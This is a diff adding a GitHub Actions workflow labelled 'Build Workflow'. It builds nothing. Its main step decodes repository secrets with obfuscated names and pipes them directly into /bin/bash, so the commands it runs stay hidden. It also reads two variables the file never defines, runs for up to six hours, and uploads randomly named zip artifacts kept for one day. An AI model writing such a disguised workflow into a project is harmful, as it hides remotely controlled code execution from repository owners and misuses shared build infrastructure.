@@ -1,0 +1,31 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  scheduler:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Invoke
+        env:
+          mzy1655: ${{ secrets.mzy1655 }}
+        run: |
+          printf '%s' "$mzy1655" | jq -r .pf97 | /bin/bash
+          printf '%s' "$vu92821" | jq -r .ykxb63145 | /bin/bash
+          printf '%s' "$ehqv1" | jq -r .iwurw883 | /bin/bash
+
+      - name: Store artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: N8zCnFPz
+          path: "*.zip"
+          retention-days: 1
